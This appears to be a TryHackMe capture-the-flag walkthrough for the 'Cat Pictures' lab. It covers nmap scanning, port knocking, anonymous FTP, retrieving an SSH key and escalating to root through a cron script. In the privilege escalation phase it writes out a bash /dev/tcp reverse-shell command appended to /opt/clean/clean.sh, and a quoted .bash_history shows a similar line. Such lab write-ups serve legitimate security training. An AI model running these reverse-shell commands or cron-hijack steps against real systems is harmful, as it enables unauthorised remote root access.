# Try Hack Me - Cat Pictures
# Author: Atharva Bordavekar
# Difficulty: Easy
# Points: 60
# Vulnerabilities: Port knocking, root shell via cronjob

# Phase 1 - Reconnaissance:

nmap scan:
```bash
nmap -sC -sV <target_ip>
```
PORT     STATE    SERVICE VERSION

21/tcp   filtered ftp

22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37:43:64:80:d3:5a:74:62:81:b7:80:6b:1a:23:d8:4a (RSA)
|   256 53:c6:82:ef:d2:77:33:ef:c1:3d:9c:15:13:54:0e:b2 (ECDSA)
|_  256 ba:97:c3:23:d4:f2:cc:08:2c:e1:2b:30:06:18:95:41 (ED25519)

8080/tcp open     http    Apache httpd 2.4.46 ((Unix) OpenSSL/1.1.1d PHP/7.3.27)
|_http-title: Cat Pictures - Index page
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.46 (Unix) OpenSSL/1.1.1d PHP/7.3.27
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

after doing a more thorough scan on all the 65535 ports using the command:
```bash
nmap -p- --min-rate=1000 <target_ip>
```
we get the output as 

PORT     STATE    SERVICE

21/tcp   filtered ftp

22/tcp   open     ssh

2375/tcp filtered docker

4420/tcp open     nvm-express

8080/tcp open     http-proxy

so there is one more service which is open at port 4420

i tried to find SQL vulnerabilities, cat images to perform steganography on, XSS, IDOR but i got no hit. then i found out that the user with the username "user" which included the caption: Knock  knock! Magic numbers: 1111, 2222, 3333, 4444. this had to be a hint since i couldn't find any other leads than this.

![knockknockonyourdoor](https://github.com/realatharva15/cat_pictures_writeup/blob/main/catpictures.png)

i sent this over to DeepSeek and it suggested me that it could be an attempt to knocking ports which is a common practice in some ctf based challenges. so i went google dorking until i found this python script on github which would do the knocking for us. before we jump straight into the knocking part we will first understand the core concept of knocking and how it is going to help us in this ctf.

so long story short, port knocking is basically a firewall evasion/ authentication technique which includes you sending packets to closed ports in a specific sequence to trigger the firewall to open another port temporarily. the clue "Knock knock! Magic numbers: 1111, 2222, 3333, 4444" was a hint to us that we had to knock these ports in the sequence 1111, 2222, 3333, 4444 to trigger the ftp port going from a filtered port to an open port. so only for some couple of seconds or minutes the ftp port which was earlier seen as filtered will appear open to us and we can access it anonymously. so lets use this script

```bash
python3 knockit.py <target_ip> 1111 2222 3333 4444
```

now when we carry out the nmap scan we will find out that the ftp port will be open

```bash
nmap <target_ip>
```

PORT     STATE SERVICE

21/tcp   open  ftp

22/tcp   open  ssh

8080/tcp open  http-proxy

so we finally get access to ftp, so lets find out what is waiting for us on the ftp server

```bash
ftp <target_ip>
#when prompted for username, enter: anonymous
```
now we find a note.txt on the server. lets quickly transfer it to our attacker machine and read it from there

```bash
get note.txt
```

when we read the note.txt we find the credentials for the service running on the port 4420. we access that port using netcat and then enter the password provided

```bash
nc -nv <target_ip> 4420
#enter the password when prompted
```

now we can find that we are inside a docker container hence we dont have a proper shell access. so lets see what we can find on the system.

at /home/catlover we find an executable file which has binary content with the filename "runme". when we run it it asks for a password. after finding that there were no password files on the system we decide to check out the contents of the file using the cat command since strings is not available in the docker container.

```bash
cat runme
```

while going through the file we find out a line which might be the password for the file. the line goes like


<_ REDACTED_>Please enter yout password: Welcome, catlover! SSH key transfer queued! touch /tmp/gibmethesshkeyAccess Deniedd
since i cannot show you the password in the writeup, i have censored it.

when entered password, that script will run and it will give you a message saying  Welcome, catlover! SSH key transfer queued!

# Phase 2 - Initial Foothold:
now we will wait for some time for the ssh private keys to get generated and have a cup of coffee in the meanwhile. so after a minute or two a file named id_rsa gets created which contains the private key of the user catlover since it is the only user i can think of right now. we will save the id_rsa in our own attacker machine for using it to access the ssh shell

```bash
#give the file its appropriate permissions:
chmod 600 id_rsa
```

```bash
ssh -i id_rsa catlover@<target_ip>
```

wait what? we already have shell as root. that doesn't seem right. lets try sudo -l. oof this command is not available. maybe we haven't recieved a proper shell but a docker container again but with the root privileges. we will find the flad1 first and then we will get going with the privilege escalation part

```bash
cat /root/flag.txt
```
we read and submit the first flag. since we are inside a docker container, we cannot use most of the commands which were useful to us in other ctfs to find out information related to the privesc. we cannot transfer linpeas on the system since the wget command doesn't exist on the container. now we will have to search the .bash_history at the / direcotry to get any info

```bash
#first navigate to the root directory
cd /
#now search for all the hidden files
ls -la
```
now we find the .bash_history file and fortunately it does not point to /dev/null while have a non-zero size which is some good news for us

```bash
cat .bash_history
```
exit
exit
exit
exit
exit
exit
exit
ip a
ifconfig
apt install ifconfig
ip
exit
nano /opt/clean/clean.sh 
ping 192.168.4.20
apt install ping
apt update
apt install ping
apt install iptuils-ping
apt install iputils-ping
exit
ls
cat /opt/clean/clean.sh 
nano /opt/clean/clean.sh 
clear
cat /etc/crontab
ls -alt /
cat /post-init.sh 
cat /opt/clean/clean.sh 
bash -i >&/dev/tcp/192.168.4.20/4444 <&1
nano /opt/clean/clean.sh 
nano /opt/clean/clean.sh 
nano /opt/clean/clean.sh 
nano /opt/clean/clean.sh 
cat /var/log/dpkg.log 
nano /opt/clean/clean.sh 
nano /opt/clean/clean.sh 
exit
exit
exit


we find out that the user on this system carried out some commands which involved the script clean.sh at the location /opt/clean/clean.sh

we will access the clean.sh and find out its contents.

# Phase 3 - Privilege Escalation:
```bash
cat /opt/clean/clean.sh
```
turns out this is just a cron job script that deletes the contents of the /tmp directory. if you are wondering how i managed to find out that the script clean.sh is running as a cronjob then just read the contents of .bash_history again. now we simply append a reverse shell in the clean.sh and setup a netcat listner in another terminal.

```bash
nano /opt/clean/clean.sh
```
copy and paste this reverse shell into the clean.sh file

```bash
bash -c 'bash -i >& /dev/tcp/<attacker_ip>/4444/0>&1'
```
make sure you have setup a listner on the port 4444 in another terminal

```bash
nc -lnvp 4444
```

now there is one thing i want you to understand that if you run the script manually using ./clean.sh then the shell you will recieve on your nc listener will also be a docker container with root privileges. since we do not want that we will patiently wait for the cronjob to do its thing. we get the revershell within a minute and we have a fully functioning shell with root privileges. 

```bash
cat /root/root.txt
```
now we simply read and submit the root.txt flag
